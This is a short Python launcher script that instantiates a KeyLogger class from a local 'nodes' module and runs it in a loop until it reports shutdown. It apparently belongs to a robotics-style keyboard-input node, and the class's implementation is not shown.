#!/usr/bin/env python

from nodes.key_logger import KeyLogger

if __name__ == '__main__':

    _keyLoggerControl = KeyLogger()

    while not _keyLoggerControl.isShutDown():
        _keyLoggerControl.run()
